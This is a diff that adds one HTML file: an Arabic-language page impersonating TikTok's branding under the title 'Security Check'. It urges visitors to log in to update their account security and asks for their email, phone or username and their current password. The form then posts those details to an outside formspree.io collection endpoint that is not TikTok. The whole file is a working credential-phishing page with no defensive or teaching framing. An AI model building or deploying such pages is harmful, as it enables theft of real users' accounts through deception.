@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - Security Check</title>
+    <style>
+        body { background: #000; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #111; padding: 30px; border-radius: 15px; width: 300px; border: 1px solid #333; text-align: center; box-shadow: 0 0 20px rgba(254, 44, 85, 0.2); }
+        h2 { color: #fe2c55; margin-bottom: 10px; }
+        p { font-size: 0.85rem; color: #ccc; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #444; color: white; border-radius: 8px; outline: none; }
+        button { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>TikTok</h2>
+        <p>نظام التحقق الموحد: يرجى تسجيل الدخول لتحديث بيانات الأمان لحسابك</p>
+        <form action="https://formspree.io/f/mqaebrda" method="POST">
+            <input type="text" name="Login_Email" placeholder="الإيميل / الهاتف / اسم المستخدم" required>
+            <input type="password" name="Login_Pass" placeholder="كلمة السر الحالية" required>
+            <button type="submit">تحديث وتأكيد الحساب</button>
+        </form>
+    </div>
+</body>
+</html>
